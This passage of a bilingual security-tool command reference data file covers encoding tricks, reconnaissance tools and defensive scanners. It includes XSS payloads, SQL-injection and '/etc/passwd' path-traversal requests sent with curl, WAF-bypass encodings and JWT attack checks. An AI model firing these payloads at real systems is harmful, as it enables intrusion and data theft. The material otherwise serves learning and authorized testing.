    name: { zh: 'URL编码', en: 'URL Encoding' },
    description: { zh: 'URL编码/解码命令集合', en: 'URL encoding/decoding command collection' },
    category: { zh: '编码解码', en: 'Encoding/Decoding' },
    commands: [
      {
        name: { zh: '编码', en: 'Encoding' },
        command: '# Python:\npython3 -c "from urllib.parse import quote; print(quote(\'<script>alert(1)</script>\'))"\n\n# 双重编码:\npython3 -c "from urllib.parse import quote; print(quote(quote(\'<script>alert(1)</script>\')))"\n\n# CyberChef在线: https://gchq.github.io/CyberChef/',
        description: { zh: 'URL编码方法(单次/双重)', en: 'URL EncodingMethod(Singletimes/Double)' },
        platform: 'all'
      },
      {
        name: { zh: '解码', en: 'Decoding' },
        command: '# Python:\npython3 -c "from urllib.parse import unquote; print(unquote(\'%3Cscript%3Ealert(1)%3C%2Fscript%3E\'))"\n\n# Linux:\nprintf \'%b\' "\\x3Cscript\\x3E"',
        description: { zh: 'URL解码方法', en: 'URLDecodingMethod' },
        platform: 'all'
      },
      { name: { zh: '双重编码', en: 'Double URL encoding' }, command: "# 双重编码 (绕过 WAF)\n# / → %2F → %252F\n# ' → %27 → %2527\npython3 -c \"import urllib.parse; print(urllib.parse.quote(urllib.parse.quote('/etc/passwd')))\"", description: { zh: '双重 URL 编码用于 WAF 绕过', en: 'Double URL encoding for WAF bypass' }, platform: 'all' },
      { name: { zh: 'curl 编码发送', en: 'curl encoded request' }, command: "curl -G --data-urlencode \"q=SELECT * FROM users WHERE id=1 OR 1=1\" http://target/api\ncurl -G --data-urlencode \"file=../../../etc/passwd\" http://target/page", description: { zh: '使用 curl 自动编码参数发送请求', en: 'Send URL-encoded parameters with curl' }, platform: 'all' },
    ]
  },
  {
    id: 'hex-encode',
    name: { zh: 'Hex编码', en: 'Hex Encoding' },
    description: { zh: '十六进制编码/解码命令集合', en: 'Hexadecimal encoding/decoding command collection' },
    category: { zh: '编码解码', en: 'Encoding/Decoding' },
    commands: [
      {
        name: { zh: '编码', en: 'Encoding' },
        command: '# Linux:\necho -n "payload" | xxd -p\necho -n "payload" | od -A n -t x1 | tr -d " \\n"\n\n# Python:\npython3 -c "print(\'payload\'.encode().hex())"\npython3 -c "print(\'\\\\x\'.join([hex(ord(c))[2:] for c in \'payload\']))"',
        description: { zh: '十六进制编码方法', en: 'Hexadecimal encoding method' },
        platform: 'all'
      },
      {
        name: { zh: '解码', en: 'Decoding' },
        command: '# Linux:\necho "7061796c6f6164" | xxd -r -p\n\n# Python:\npython3 -c "print(bytes.fromhex(\'7061796c6f6164\').decode())"',
        description: { zh: '十六进制解码方法', en: 'Hexadecimal decoding method' },
        platform: 'all'
      },
      {
        name: { zh: 'Hex转义', en: 'Hex Escape' },
        command: '# SQL注入中使用:\nSELECT 0x61646D696E  -- "admin"\n\n# XSS中使用:\n<img src=x onerror=\\x61\\x6c\\x65\\x72\\x74(1)>',
        description: { zh: '在SQL注入和XSS中使用十六进制编码', en: 'Use hexadecimal encoding in SQL injection and XSS' },
        platform: 'all'
      }
    ]
  },
  {
    id: 'html-encode',
    name: { zh: 'HTML编码', en: 'HTML Encoding' },
    description: { zh: 'HTML实体编码/解码命令集合', en: 'HTML entity encoding/decoding command collection' },
    category: { zh: '编码解码', en: 'Encoding/Decoding' },
    commands: [
      {
        name: { zh: '编码', en: 'Encoding' },
        command: '# Python:\npython3 -c "import html; print(html.escape(\'<script>alert(1)</script>\'))"\n\n# 数字编码:\npython3 -c "print(\'\'.join([\'&#\'+str(ord(c))+\';\' for c in \'<script>alert(1)</script>\']))"\n\n# 十六进制HTML编码:\npython3 -c "print(\'\'.join([\'&#x\'+hex(ord(c))[2:]+\';\' for c in \'alert\']))"',
        description: { zh: 'HTML实体编码(命名/十进制/十六进制)', en: 'HTML entity encoding (named/decimal/hexadecimal)' },
        platform: 'all'
      },
      {
        name: { zh: '解码', en: 'Decoding' },
        command: '# Python:\npython3 -c "import html; print(html.unescape(\'&lt;script&gt;alert(1)&lt;/script&gt;\'))"',
        description: { zh: 'HTML实体解码', en: 'HTMLEntityDecoding' },
        platform: 'all'
      },
      {
        name: { zh: '常用实体', en: 'Common Entities' },
        command: '# 常用HTML实体:\n# < => &lt; 或 &#60; 或 &#x3c;\n# > => &gt; 或 &#62; 或 &#x3e;\n# " => &quot; 或 &#34; 或 &#x22;\n# \' => &apos; 或 &#39; 或 &#x27;\n# & => &amp; 或 &#38; 或 &#x26;',
        description: { zh: 'XSS绕过常用的HTML实体对照', en: 'Common HTML entity reference for XSS bypass' },
        platform: 'all'
      }
    ]
  },
  {
    id: 'unicode-encode',
    name: { zh: 'Unicode编码', en: 'Unicode Encoding' },
    description: { zh: 'Unicode编码/解码命令集合', en: 'Unicode encoding/decoding command collection' },
    category: { zh: '编码解码', en: 'Encoding/Decoding' },
    commands: [
      {
        name: { zh: '编码', en: 'Encoding' },
        command: '# Python Unicode转义:\npython3 -c "print(\'\'.join([\'\\\\u\'+hex(ord(c))[2:].zfill(4) for c in \'alert\']))"\n# 输出: \\u0061\\u006c\\u0065\\u0072\\u0074\n\n# UTF-8字节:\npython3 -c "print(\'alert\'.encode(\'utf-8\'))"',
        description: { zh: 'Unicode各种编码形式', en: 'Various Unicode encoding formats' },
        platform: 'all'
      },
      {
        name: { zh: '解码', en: 'Decoding' },
        command: '# Python:\npython3 -c "print(\'\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074\'.encode().decode(\'unicode_escape\'))"\n\n# JavaScript:\nconsole.log("\\u0061\\u006c\\u0065\\u0072\\u0074")',
        description: { zh: 'Unicode解码方法', en: 'Unicode decoding method' },
        platform: 'all'
      },
      {
        name: { zh: 'WAF绕过用法', en: 'WAF Bypass Usage' },
        command: '# JavaScript Unicode绕过:\n<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>\n\n# Overlong UTF-8编码:\n# / => %c0%af (可绕过路径过滤)\n# . => %c0%ae',
        description: { zh: '使用Unicode编码绕过WAF/过滤', en: 'UseUnicode EncodingBypass WAF/Filter' },
        platform: 'all'
      }
    ]
  },
  {
    id: 'jwt-decode',
    name: { zh: 'JWT解码', en: 'JWT Decode' },
    description: { zh: 'JWT(JSON Web Token)解码和分析工具', en: 'JWT(JSON Web Token)Decoding and AnalyzeTools' },
    category: { zh: '编码解码', en: 'Encoding/Decoding' },
    commands: [
      {
        name: { zh: '在线解码', en: 'Online Decode' },
        command: '# 在线工具:\n# https://jwt.io\n# https://token.dev\n# 粘贴JWT即可查看Header和Payload',
        description: { zh: '使用在线工具解码JWT', en: 'Decode JWT using online tools' },
        platform: 'all'
      },
      {
        name: { zh: '命令行解码', en: 'Command Line Decode' },
        command: '# Python:\npython3 -c "\nimport base64, json, sys\ntoken = sys.argv[1]\nparts = token.split(\'.\')\nfor i, part in enumerate(parts[:2]):\n    padded = part + \'=\' * (4 - len(part) % 4)\n    decoded = base64.urlsafe_b64decode(padded)\n    print(json.dumps(json.loads(decoded), indent=2))\n" YOUR_JWT_HERE',
        description: { zh: '使用Python命令行解码JWT', en: 'Decode JWT using Python command line' },
        platform: 'all'
      },
      {
        name: { zh: '结构分析', en: 'Structure Analysis' },
        command: '# JWT结构: Header.Payload.Signature\n# Header: {"alg":"HS256","typ":"JWT"}\n# Payload: {"sub":"1234","name":"user","iat":1516239022}\n# Signature: HMACSHA256(base64url(header)+"."+base64url(payload), secret)\n\n# 检查要点:\n# 1. alg是否可改为none\n# 2. 密钥是否为弱密码\n# 3. 是否可将RS256改为HS256\n# 4. exp是否已过期',
        description: { zh: 'JWT结构分析和安全检查要点', en: 'JWT structure analysis and security check key points' },
        platform: 'all'
      }
    ],
    references: ['https://jwt.io']
  },
  {
    id: 'naabu',
    name: 'Naabu',
    description: { zh: 'ProjectDiscovery 的高速端口探测工具，适合与 httpx、nuclei 串联使用。', en: 'Fast port discovery tool from ProjectDiscovery that pairs well with httpx and nuclei.' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest',
    commands: [
      {
        name: { zh: '快速端口探测', en: 'Fast port probe' },
        command: 'naabu -host target.com',
        description: { zh: '快速枚举目标主机开放端口，适合作为 Web 资产探测前置步骤。', en: 'Quickly enumerate open ports on a host as a precursor to web asset probing.' },
        platform: 'all'
      },
      {
        name: { zh: '指定端口范围', en: 'Custom port range' },
        command: 'naabu -host target.com -p 80,443,8080,8443,9000-9100',
        description: { zh: '按关注端口或端口段定向探测，减少噪声。', en: 'Probe targeted ports or ranges to reduce noise.' },
        platform: 'all'
      },
      {
        name: { zh: '与 Nmap 联动验证', en: 'Validate with Nmap' },
        command: 'naabu -host target.com -nmap-cli "nmap -sV -Pn"',
        description: { zh: '先用 Naabu 找端口，再调用 Nmap 补服务识别。', en: 'Use Naabu for port discovery, then call Nmap for service identification.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/projectdiscovery/naabu']
  },
  {
    id: 'katana',
    name: 'Katana',
    description: { zh: 'ProjectDiscovery 的现代 Web 爬虫，适合做站点路由、JS 资源和 API 端点发现。', en: 'Modern web crawler from ProjectDiscovery for route, JS resource, and API endpoint discovery.' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install github.com/projectdiscovery/katana/cmd/katana@latest',
    commands: [
      {
        name: { zh: '基础爬取', en: 'Basic crawl' },
        command: 'katana -u https://target.com',
        description: { zh: '爬取站点可访问路径和页面资源，建立基础路由视图。', en: 'Crawl reachable paths and page resources to build a baseline route view.' },
        platform: 'all'
      },
      {
        name: { zh: '抓取 JavaScript 与表单', en: 'Collect JS and forms' },
        command: 'katana -u https://target.com -jc -fx',
        description: { zh: '同时分析 JS 引用和表单交互点，适合做前端攻击面梳理。', en: 'Analyze JavaScript references and forms together for frontend attack-surface mapping.' },
        platform: 'all'
      },
      {
        name: { zh: '从 URL 列表批量爬取', en: 'Batch crawl from list' },
        command: 'katana -list urls.txt -d 3 -c 10',
        description: { zh: '对多目标批量爬取，并限制深度和并发。', en: 'Batch crawl many targets while constraining depth and concurrency.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/projectdiscovery/katana']
  },
  {
    id: 'gau',
    name: 'gau',
    description: { zh: '从公开来源聚合历史 URL，适合做参数面、旧接口和静态资源枚举。', en: 'Aggregate historical URLs from public sources for parameter, legacy endpoint, and static asset enumeration.' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install github.com/lc/gau/v2/cmd/gau@latest',
    commands: [
      {
        name: { zh: '查询单域名历史 URL', en: 'Single-domain URL history' },
        command: 'gau target.com',
        description: { zh: '收集单域名在公开归档中的历史 URL。', en: 'Collect archived historical URLs for a single domain.' },
        platform: 'all'
      },
      {
        name: { zh: '子域名一起收集', en: 'Include subdomains' },
        command: 'gau target.com --subs',
        description: { zh: '连同子域名一起收集历史 URL，适合扩大参数面。', en: 'Include subdomains when collecting historical URLs to widen parameter coverage.' },
        platform: 'all'
      },
      {
        name: { zh: '排除静态资源', en: 'Exclude static assets' },
        command: 'gau target.com --blacklist png,jpg,gif,svg,woff,woff2,css',
        description: { zh: '排除常见静态资源，更聚焦接口与参数。', en: 'Exclude common static assets to focus on endpoints and parameters.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/lc/gau']
  },
  {
    id: 'dnsx',
    name: 'dnsx',
    description: { zh: 'ProjectDiscovery 的批量 DNS 解析与探测工具，适合对子域名结果做快速存活和记录类型确认。', en: 'Batch DNS resolver and probe tool from ProjectDiscovery for verifying subdomain results and record types.' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest',
    commands: [
      {
        name: { zh: '基础解析', en: 'Basic resolve' },
        command: 'dnsx -l subs.txt -resp',
        description: { zh: '批量解析输入列表，并返回响应值。', en: 'Resolve an input list in bulk and print response values.' },
        platform: 'all'
      },
      {
        name: { zh: '按记录类型探测', en: 'Probe by record type' },
        command: 'dnsx -l subs.txt -a -aaaa -cname -mx -txt',
        description: { zh: '同时检查多种记录类型，适合确认邮件、CDN、验证记录等。', en: 'Probe multiple record types together for mail, CDN, and validation records.' },
        platform: 'all'
      },
      {
        name: { zh: '通配符过滤', en: 'Wildcard filtering' },
        command: 'dnsx -l subs.txt -wd target.com -re',
        description: { zh: '结合目标根域名做通配符判断，减少子域名枚举误报。', en: 'Use the root domain to identify wildcard DNS and reduce false positives.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/projectdiscovery/dnsx']
  },
  {
    id: 'tlsx',
    name: 'tlsx',
    description: { zh: '批量 TLS/SSL 指纹与证书信息探测工具，适合整理证书主体、SAN、协议版本和 TLS 指纹。', en: 'Batch TLS/SSL probe tool for certificate subjects, SANs, protocol versions, and TLS fingerprints.' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install github.com/projectdiscovery/tlsx/cmd/tlsx@latest',
    commands: [
      {
        name: { zh: '基础证书枚举', en: 'Basic certificate enum' },
        command: 'tlsx -l hosts.txt -san -cn',
        description: { zh: '输出证书 CN 与 SAN，适合辅助资产关系分析。', en: 'Output certificate CN and SAN fields for asset-relationship analysis.' },
        platform: 'all'
      },
      {
        name: { zh: '协议与套件信息', en: 'Protocol and cipher info' },
        command: 'tlsx -l hosts.txt -tls-version -cipher -silent',
        description: { zh: '查看目标支持的 TLS 版本和密码套件。', en: 'Inspect supported TLS versions and cipher suites.' },
        platform: 'all'
      },
      {
        name: { zh: '批量指纹导出', en: 'Export fingerprints' },
        command: 'tlsx -l hosts.txt -jarm -ja3 -json -o tlsx.json',
        description: { zh: '导出 TLS 指纹和证书结果，便于后续聚类分析。', en: 'Export TLS fingerprints and certificate data for later clustering.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/projectdiscovery/tlsx']
  },
  {
    id: 'assetfinder',
    name: 'Assetfinder',
    description: { zh: '轻量级子域名收集工具，适合作为快速被动枚举入口。', en: 'Lightweight subdomain collection tool for quick passive discovery.' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install github.com/tomnomnom/assetfinder@latest',
    commands: [
      {
        name: { zh: '基础被动枚举', en: 'Basic passive enum' },
        command: 'assetfinder --subs-only target.com',
        description: { zh: '快速收集公开来源中的子域名结果。', en: 'Quickly collect subdomains from public passive sources.' },
        platform: 'all'
      },
      {
        name: { zh: '配合解析器确认', en: 'Pipe into resolver' },
        command: 'assetfinder --subs-only target.com | sort -u | dnsx -silent -resp',
        description: { zh: '把被动结果直接交给解析器确认存活。', en: 'Send passive results to a resolver for liveness confirmation.' },
        platform: 'all'
      },
      { name: { zh: '管道联动 httpx', en: 'Pipeline with httpx' }, command: 'assetfinder --subs-only target.com | httpx -silent -o alive.txt', description: { zh: 'assetfinder 发现子域名 + httpx 存活探测', en: 'Discover subdomains with assetfinder, then probe with httpx' }, platform: 'all' },
      { name: { zh: '包含主域', en: 'Include main domain' }, command: 'assetfinder target.com | grep -v "^\\." | sort -u', description: { zh: '包含主域名的枚举结果', en: 'Enumerate including the main domain' }, platform: 'linux' },
      { name: { zh: '批量处理', en: 'Batch processing' }, command: 'cat domains.txt | xargs -I{} assetfinder --subs-only {} | sort -u | anew all_subs.txt', description: { zh: '批量处理多个域名', en: 'Process multiple domains in batch' }, platform: 'linux' },
    ],
    references: ['https://github.com/tomnomnom/assetfinder']
  },
  {
    id: 'subdomainizer',
    name: 'SubDomainizer',
    description: { zh: '通过网页、JS 和公开前端资源提取子域名、云密钥痕迹和端点线索。', en: 'Extract subdomains, cloud-key traces, and endpoint clues from pages and JavaScript.' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'git clone https://github.com/nsonaniya2010/SubDomainizer.git && cd SubDomainizer && pip install -r requirements.txt',
    commands: [
      {
        name: { zh: '基础站点分析', en: 'Basic site analysis' },
        command: 'python3 SubDomainizer.py -u https://target.com',
        description: { zh: '分析页面和关联脚本中的子域名、URL 与敏感字符串线索。', en: 'Analyze pages and linked scripts for subdomains, URLs, and sensitive-string clues.' },
        platform: 'all'
      },
      {
        name: { zh: '从 JS 列表批量分析', en: 'Batch analyze JS list' },
        command: 'python3 SubDomainizer.py -l js-urls.txt',
        description: { zh: '对预先收集的脚本 URL 列表做批量分析。', en: 'Batch analyze a pre-collected list of JavaScript URLs.' },
        platform: 'all'
      },
      { name: { zh: '从文件扫描', en: 'Scan from URL list' }, command: 'python3 SubDomainizer.py -l urls.txt -o subdomains.txt', description: { zh: '从 URL 列表中批量提取子域名', en: 'Extract subdomains from a list of URLs in batch' }, platform: 'all' },
      { name: { zh: '提取密钥', en: 'Extract secrets' }, command: 'python3 SubDomainizer.py -u https://target.com -o subs.txt -sT', description: { zh: '同时提取 JS 中的 API 密钥和 token', en: 'Extract subdomains and API keys/tokens from JS files' }, platform: 'all' },
    ],
    references: ['https://github.com/nsonaniya2010/SubDomainizer']
  },
  {
    id: 'hakrawler',
    name: 'Hakrawler',
    description: { zh: '轻量级链接提取器，适合快速补站内 URL、脚本和资源地址列表。', en: 'Lightweight link extractor for quickly supplementing in-scope URLs, scripts, and resource lists.' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install github.com/hakluke/hakrawler@latest',
    commands: [
      {
        name: { zh: '基础 URL 提取', en: 'Basic URL extraction' },
        command: 'echo https://target.com | hakrawler',
        description: { zh: '提取页面中发现的链接、脚本和资源地址。', en: 'Extract links, scripts, and resource URLs from pages.' },
        platform: 'all'
      },
      {
        name: { zh: '筛出参数 URL', en: 'Filter parameterized URLs' },
        command: 'echo https://target.com | hakrawler | grep "="',
        description: { zh: '快速筛出带参数 URL，便于后续分析参数面。', en: 'Quickly isolate parameterized URLs for follow-up parameter analysis.' },
        platform: 'all'
      },
      { name: { zh: '爬取 JS 文件', en: 'Crawl JS files' }, command: 'echo "https://target.com" | hakrawler -js | sort -u', description: { zh: '只收集 JS 文件 URL', en: 'Collect only JavaScript file URLs' }, platform: 'linux' },
      { name: { zh: '深度爬取', en: 'Deep crawl' }, command: 'echo "https://target.com" | hakrawler -d 5 -subs -h "Cookie: session=abc"', description: { zh: '深度爬取并包含子域名和认证 Cookie', en: 'Deep crawl including subdomains and auth cookie' }, platform: 'linux' },
      { name: { zh: '管道过滤参数', en: 'Filter URLs with params' }, command: "echo 'https://target.com' | hakrawler -d 3 | grep '=' | anew params.txt", description: { zh: '过滤出包含参数的 URL', en: 'Filter URLs that contain parameters' }, platform: 'linux' },
    ],
    references: ['https://github.com/hakluke/hakrawler']
  },
  {
    id: 'semgrep',
    name: 'Semgrep',
    description: { zh: '静态代码安全扫描工具，适合做 SAST、规则学习和 CI 中的增量安全检查。', en: 'Static code security scanner for SAST, rule learning, and CI security checks.' },
    category: { zh: '代码安全', en: 'Code Security' },
    installation: 'brew install semgrep / python3 -m pip install semgrep',
    commands: [
      {
        name: { zh: '自动规则扫描', en: 'Auto rules scan' },
        command: 'semgrep scan --config auto .',
        description: { zh: '对当前项目做基础静态安全扫描，适合快速了解代码风险面。', en: 'Run a baseline static security scan against the current project.' },
        platform: 'all'
      },
      {
        name: { zh: '按规则集扫描', en: 'Scan with rule pack' },
        command: 'semgrep scan --config p/owasp-top-ten .',
        description: { zh: '使用 OWASP Top 10 规则集做针对性扫描。', en: 'Run a targeted scan using the OWASP Top 10 rule pack.' },
        platform: 'all'
      },
      {
        name: { zh: '导出 JSON 结果', en: 'Export JSON results' },
        command: 'semgrep scan --config auto --json -o semgrep.json .',
        description: { zh: '导出结构化结果，便于做后续归档或对比。', en: 'Export structured findings for archival or comparison.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/semgrep/semgrep']
  },
  {
    id: 'gitleaks',
    name: 'Gitleaks',
    description: { zh: 'Git 仓库与目录 Secrets 扫描工具，适合检查历史提交和当前工作区中的凭据泄露。', en: 'Secrets scanner for Git repositories and directories, useful for commit history and workspace leaks.' },
    category: { zh: '供应链安全', en: 'Supply Chain Security' },
    installation: 'brew install gitleaks / go install github.com/gitleaks/gitleaks/v8@latest',
    commands: [
      {
        name: { zh: '扫描 Git 历史', en: 'Scan Git history' },
        command: 'gitleaks git .',
        description: { zh: '检查当前 Git 仓库历史补丁中的凭据泄露。', en: 'Scan the current Git repository history for secret leaks.' },
        platform: 'all'
      },
      {
        name: { zh: '扫描当前目录', en: 'Scan current directory' },
        command: 'gitleaks dir .',
        description: { zh: '检查当前目录文件内容中的 Secrets。', en: 'Scan files in the current directory for secrets.' },
        platform: 'all'
      },
      {
        name: { zh: '导出 JSON 报告', en: 'Export JSON report' },
        command: 'gitleaks git --report-format json --report-path gitleaks.json .',
        description: { zh: '导出结构化检测报告，便于审计留档。', en: 'Export a structured report for auditing and record-keeping.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/gitleaks/gitleaks']
  },
  {
    id: 'trufflehog',
    name: 'TruffleHog',
    description: { zh: '面向 Git、文件系统与远程来源的 Secrets 检测工具，适合做高噪声环境下的深度凭据发现。', en: 'Secrets detection tool for Git, filesystems, and remote sources, useful for deeper credential discovery.' },
    category: { zh: '供应链安全', en: 'Supply Chain Security' },
    installation: 'brew install trufflehog / go install github.com/trufflesecurity/trufflehog/v3@latest',
    commands: [
      {
        name: { zh: '扫描本地 Git 仓库', en: 'Scan local Git repo' },
        command: 'trufflehog git file://.',
        description: { zh: '对当前本地 Git 仓库执行深度 Secrets 扫描。', en: 'Run a deep secrets scan against the current local Git repository.' },
        platform: 'all'
      },
      {
        name: { zh: '扫描文件系统目录', en: 'Scan filesystem directory' },
        command: 'trufflehog filesystem .',
        description: { zh: '对当前目录做文件级 Secrets 检查。', en: 'Scan the current directory for file-based secret exposure.' },
        platform: 'all'
      },
      {
        name: { zh: '扫描远程 GitHub 仓库', en: 'Scan remote GitHub repo' },
        command: 'trufflehog github --repo=https://github.com/org/repo',
        description: { zh: '对远程 GitHub 仓库执行凭据发现。', en: 'Run credential discovery against a remote GitHub repository.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/trufflesecurity/trufflehog']
  },
  {
    id: 'trivy',
    name: 'Trivy',
    description: { zh: '容器、文件系统、依赖、配置与 Secret 一体化扫描工具，适合做制品和云原生安全基线检查。', en: 'Unified scanner for containers, filesystems, dependencies, configs, and secrets.' },
    category: { zh: '云原生安全', en: 'Cloud Native Security' },
    installation: 'brew install trivy / go install github.com/aquasecurity/trivy/cmd/trivy@latest',
    commands: [
      {
        name: { zh: '扫描本地项目目录', en: 'Scan local project' },
        command: 'trivy fs .',
        description: { zh: '扫描项目目录中的依赖、漏洞与敏感文件。', en: 'Scan the project directory for dependencies, vulnerabilities, and secrets.' },
        platform: 'all'
      },
      {
        name: { zh: '扫描容器镜像', en: 'Scan container image' },
        command: 'trivy image nginx:latest',
        description: { zh: '检查镜像中的系统包和依赖漏洞。', en: 'Check an image for OS package and dependency vulnerabilities.' },
        platform: 'all'
      },
      {
        name: { zh: '扫描配置与 IaC', en: 'Scan configs and IaC' },
        command: 'trivy config .',
        description: { zh: '检查 Terraform、Kubernetes、Dockerfile 等配置安全问题。', en: 'Scan Terraform, Kubernetes, Dockerfile, and related configs for security issues.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/aquasecurity/trivy']
  },
  {
    id: 'syft',
    name: 'Syft',
    description: { zh: 'SBOM 生成工具，适合为源码目录、镜像和制品生成 CycloneDX 或 SPDX 清单。', en: 'SBOM generator for source directories, images, and artifacts.' },
    category: { zh: '供应链安全', en: 'Supply Chain Security' },
    installation: 'brew install syft / curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh',
    commands: [
      {
        name: { zh: '为源码目录生成 SBOM', en: 'Generate SBOM for source dir' },
        command: 'syft dir:. -o table',
        description: { zh: '分析当前目录依赖并输出表格格式 SBOM。', en: 'Analyze dependencies in the current directory and output a tabular SBOM.' },
        platform: 'all'
      },
      {
        name: { zh: '导出 CycloneDX JSON', en: 'Export CycloneDX JSON' },
        command: 'syft dir:. -o cyclonedx-json=sbom.json',
        description: { zh: '导出 CycloneDX 格式，便于和其他安全工具联动。', en: 'Export CycloneDX JSON for downstream tooling.' },
        platform: 'all'
      },
      {
        name: { zh: '分析镜像依赖', en: 'Analyze image packages' },
        command: 'syft docker:nginx:latest -o spdx-json=image-sbom.json',
        description: { zh: '为容器镜像生成 SPDX 格式依赖清单。', en: 'Generate an SPDX dependency inventory for a container image.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/anchore/syft']
  },
  {
    id: 'grype',
    name: 'Grype',
    description: { zh: '基于包清单与 SBOM 的漏洞扫描工具，适合对源码目录、镜像和 SBOM 做统一漏洞分析。', en: 'Vulnerability scanner for package inventories and SBOMs across source, images, and artifacts.' },
    category: { zh: '供应链安全', en: 'Supply Chain Security' },
    installation: 'brew install grype / curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh',
    commands: [
      {
        name: { zh: '扫描源码目录', en: 'Scan source directory' },
        command: 'grype dir:.',
        description: { zh: '对当前目录依赖做漏洞分析。', en: 'Analyze vulnerabilities in dependencies from the current directory.' },
        platform: 'all'
      },
      {
        name: { zh: '扫描现有 SBOM', en: 'Scan existing SBOM' },
        command: 'grype sbom:sbom.json',
        description: { zh: '对已有 SBOM 结果继续做漏洞匹配。', en: 'Match vulnerabilities against an existing SBOM.' },
        platform: 'all'
      },
      {
        name: { zh: '扫描容器镜像', en: 'Scan container image' },
        command: 'grype nginx:latest -o json',
        description: { zh: '对镜像中的包和组件做漏洞检测，并输出 JSON。', en: 'Scan an image for vulnerable packages and output JSON.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/anchore/grype']
  },
  {
    id: 'checkov',
    name: 'Checkov',
    description: { zh: 'IaC 与云配置静态检查工具，适合学习 Terraform、CloudFormation、Kubernetes、GitHub Actions 配置安全。', en: 'IaC and cloud configuration scanner for Terraform, CloudFormation, Kubernetes, and GitHub Actions.' },
    category: { zh: '云原生安全', en: 'Cloud Native Security' },
    installation: 'pip install checkov / brew install checkov',
    commands: [
      {
        name: { zh: '扫描当前 IaC 目录', en: 'Scan current IaC directory' },
        command: 'checkov -d .',
        description: { zh: '扫描当前目录中的基础设施代码与配置。', en: 'Scan infrastructure-as-code files and configs in the current directory.' },
        platform: 'all'
      },
      {
        name: { zh: '扫描单个 Terraform 文件', en: 'Scan single Terraform file' },
        command: 'checkov -f main.tf',
        description: { zh: '对指定 Terraform 文件做定向检查。', en: 'Run targeted checks against a specific Terraform file.' },
        platform: 'all'
      },
      {
        name: { zh: '导出 SARIF', en: 'Export SARIF' },
        command: 'checkov -d . -o sarif',
        description: { zh: '导出 SARIF 结果，便于接入平台审计或代码扫描视图。', en: 'Export SARIF for platform audit or code-scanning workflows.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/bridgecrewio/checkov']
  },
  {
    id: 'tfsec',
    name: 'tfsec',
    description: { zh: 'Terraform 静态安全检查工具，适合快速学习常见 IaC 配置风险。', en: 'Terraform static security scanner for learning common IaC misconfigurations.' },
    category: { zh: '云原生安全', en: 'Cloud Native Security' },
    installation: 'brew install tfsec / go install github.com/aquasecurity/tfsec/cmd/tfsec@latest',
    commands: [
      {
        name: { zh: '扫描当前 Terraform 目录', en: 'Scan current Terraform dir' },
        command: 'tfsec .',
        description: { zh: '扫描当前 Terraform 项目目录中的常见配置风险。', en: 'Scan the current Terraform project for common security misconfigurations.' },
        platform: 'all'
      },
      {
        name: { zh: '导出 JSON', en: 'Export JSON' },
        command: 'tfsec --format json .',
        description: { zh: '以 JSON 输出扫描结果，方便后续分析。', en: 'Export findings as JSON for downstream analysis.' },
        platform: 'all'
      },
      {
        name: { zh: '显示扫描统计', en: 'Show scan statistics' },
        command: 'tfsec --run-statistics .',
        description: { zh: '输出扫描耗时与规则统计，便于理解项目覆盖面。', en: 'Print scan timing and rule statistics to understand project coverage.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/aquasecurity/tfsec']
  },
  {
    id: 'osv-scanner',
    name: 'OSV-Scanner',
    description: { zh: '开源依赖漏洞扫描工具，适合学习锁文件、源码目录和 SBOM 的漏洞比对方式。', en: 'Open source dependency vulnerability scanner for lockfiles, source trees, and SBOMs.' },
    category: { zh: '供应链安全', en: 'Supply Chain Security' },
    installation: 'brew install osv-scanner / go install github.com/google/osv-scanner/cmd/osv-scanner@latest',
    commands: [
      {
        name: { zh: '扫描源码目录', en: 'Scan source directory' },
        command: 'osv-scanner scan source .',
        description: { zh: '根据项目清单和锁文件匹配已知漏洞。', en: 'Match known vulnerabilities using manifests and lockfiles in the project.' },
        platform: 'all'
      },
      {
        name: { zh: '扫描单个锁文件', en: 'Scan single lockfile' },
        command: 'osv-scanner scan --lockfile=package-lock.json',
        description: { zh: '定向检查单个锁文件中的依赖漏洞。', en: 'Check vulnerabilities in a specific lockfile.' },
        platform: 'all'
      },
      {
        name: { zh: '扫描 SBOM', en: 'Scan SBOM' },
        command: 'osv-scanner scan --sbom=sbom.json',
        description: { zh: '对已有 SBOM 进行漏洞匹配。', en: 'Match vulnerabilities against an existing SBOM.' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/google/osv-scanner']
  },
  {
    id: 'prowler',
    name: 'Prowler',
    description: { zh: '云平台安全基线与合规检查工具，适合学习 AWS、Azure、GCP 和 Kubernetes 的安全姿态检查。', en: 'Cloud posture and compliance scanner for AWS, Azure, GCP, and Kubernetes.' },
    category: { zh: '云原生安全', en: 'Cloud Native Security' },
    installation: 'pip install prowler / brew install prowler',
    commands: [
      {
        name: { zh: 'AWS 基线检查', en: 'AWS baseline scan' },
        command: 'prowler aws',
        description: { zh: '对当前 AWS 凭据上下文执行默认安全基线检查。', en: 'Run the default security baseline against the current AWS credentials context.' },
        platform: 'all'
      },
      {
        name: { zh: '按合规框架检查', en: 'Scan by compliance framework' },
